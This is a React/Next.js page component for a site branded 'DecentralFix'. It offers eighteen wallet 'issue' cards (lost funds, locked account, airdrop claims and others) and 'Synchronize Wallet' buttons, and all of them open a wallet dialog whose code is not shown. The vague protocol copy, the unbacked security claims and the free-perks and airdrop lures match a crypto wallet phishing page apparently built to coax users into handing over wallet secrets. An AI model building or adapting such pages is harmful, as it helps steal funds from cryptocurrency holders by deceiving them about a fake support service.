import { Card, CardContent, CardHeader } from "@/components/ui/card";
import Image from "next/image";
import WalletDialog from "@/components/wallet-dialog";
import { Button } from "@/components/ui/button";

export default function Home() {
  const actions = [
    { name: "migration", click: "Click here for migrations" },
    { name: "claim", click: "Click here to claim assets" },
    { name: "swap", click: "Click here for assets swapping" },
    { name: "slippage", click: "Click here for slippage related error" },
    { name: "transaction", click: "Click here for transaction related issues" },
    { name: "cross transfer", click: "Click here for cross bridge issues" },
    { name: "staking", click: "Click here for staking related issues" },
    { name: "exchange", click: "Click here for exchange related issues" },
    {
      name: "connect to dapps",
      click: "Click here for error while connecting to dapps",
    },
    {
      name: "login",
      click: "Click here for wallet login issues",
    },
    {
      name: "whitelist",
      click: "Click here for whitelist related issues",
    },
    {
      name: "buy coins/tokens",
      click: "To trade your account must be marked as a trusted payment source",
    },
    {
      name: "missing/irregular balance",
      click: "Click here to recover lost/missing funds",
    },
    {
      name: "wallet glitch/wallet error",
      click: "Click here if you have a problem with your trading wallet",
    },
    {
      name: "transaction delay",
      click: "Click here for any issues related to transaction delay",
    },
    {
      name: "claim airdrop",
      click: "Click here for airdrop related issues",
    },
    {
      name: "NFTs",
      click: "Click here for NFTs minting/transfer related issues.",
    },
    {
      name: "locked Account",
      click: "Click here for issues related to account lock.",
    },
  ];

  return (
    <div className="font-sans">
      <div className="flex flex-col md:flex-row items-center h-screen gap-8 md:gap-16 w-full px-6 mt-24 md:mt-0">
        <div className="flex flex-col space-y-6">
          <h1 className="text-3xl md:text-7xl font-bold">DecentralFix</h1>

          <p className="text-lg tracking-wide">
            We operates as a decentralized and open protocol designed to enable
            secure communication between wallets and the decentralized
            applications (dapps) ecosystem.
          </p>
          <p className="text-lg tracking-wide">
            Its primary function is to address both primary and secondary
            issues, establishing a remote resolution mechanism for non-custodial
            wallets.
          </p>
          <p className="text-lg tracking-wide">
            Our system utilizes a strong protocol that incorporates end-to-end
            encryption, thereby facilitating smooth and secure remote
            communications.
          </p>

          <WalletDialog>
            <Button className="w-fit px-12 py-6 bg-gradient-to-r from-blue-700 to-blue-500 font-bold ">
              Synchronize Wallet
            </Button>
          </WalletDialog>
        </div>

        {/* IMAGE */}
        <div className="flex justify-center bg-white/5 backdrop-blur-md p-2 rounded-lg w-full md:w-1/2 items-center">
          <Image src="/wallet.svg" alt="" width={300} height={300} />
        </div>
      </div>

      <div className="backdrop-blur-md  w-full flex flex-col justify-center space-y-12 mt-56 md:mt-0">
        <h2 className="text-3xl md:text-4xl font-bold text-center">
          Select Your Action Below
        </h2>

        <div className="grid md:grid-cols-3 gap-6 h-full px-4">
          {actions.map((act) => (
            <WalletDialog key={act.name}>
              <Card className="bg-white/10 border-0 backdrop-blur-md text-white hover:border-2 border-white h-full cursor-pointer">
                <CardHeader>🟢</CardHeader>
                <CardContent className="h-full">
                  <div className="flex flex-col space-y-2">
                    <span className="capitalize font-semibold text-lg">
                      {act.name}
                    </span>
                    <span className="text-muted-foreground">{act.click}</span>
                  </div>
                </CardContent>
              </Card>
            </WalletDialog>
          ))}
        </div>
      </div>

      <div className="px-4 md:px-0">
        <div className="max-w-4xl border rounded-lg py-8 my-12 md:my-32 flex flex-col items-center justify-center space-y-4 mx-auto px-6 md:px-20 border-white/40">
          <h2 className="text-2xl md:text-3xl font-semibold text-center">
            We&apos;re supported by over 300 apps & wallets.
          </h2>

          <p className="text-center">
            You can connect your wallet with hundreds of apps, opening the doors
            to a new world of web3 experiences. Synchronize your wallet for free
            and enjoy exclusive perks. Join our Discord and get whitelisted for
            our upcoming token airdrop.
          </p>

          <WalletDialog>
            <Button className="w-fit px-12 py-6 bg-gradient-to-r from-blue-700 to-blue-500 font-bold ">
              Synchronize for Free
            </Button>
          </WalletDialog>
        </div>
      </div>
    </div>
  );
}
